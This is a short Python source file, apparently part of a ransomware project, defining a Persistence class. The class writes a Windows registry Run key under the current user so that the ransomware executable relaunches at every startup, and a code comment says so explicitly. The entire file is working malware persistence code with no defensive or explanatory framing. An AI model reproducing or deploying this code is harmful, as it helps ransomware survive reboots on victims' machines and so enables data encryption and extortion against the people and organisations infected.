from win32api import GetCommandLine, GetFullPathName
from os import system
from os.path import expanduser,isfile,dirname,realpath
from sys import path
import winreg # Interact with registery key
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *


class Persistence: 


    def __init__(self):
        self.check_reg()
        
        
    def add_reg(self):
        'Add a key to the registre'
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER # Target the tree
            key = winreg.OpenKey(reg_hkey, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) # Open the key to sub_dir 'RUN' : every time the pc turn on the ransomware will be execute
            winreg.SetValueEx(key, 'test', 0, winreg.REG_SZ, RANSOW_FILE_REGEDIT) # Set the value with name of 'test'
            winreg.CloseKey(key) # Close the key
        except Exception as e :
            print('Error in add_reg : ',e)
            pass


    def check_reg(self):
        'Check if our key is in registre'
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'test' not in v:
                    index+=1
                    continue
                return True
        except Exception as e :
            print('No KEY in reg, add it ...')
            winreg.CloseKey(key)
            self.add_reg()


if __name__ == "__main__" : 
    Persistence()
    pass    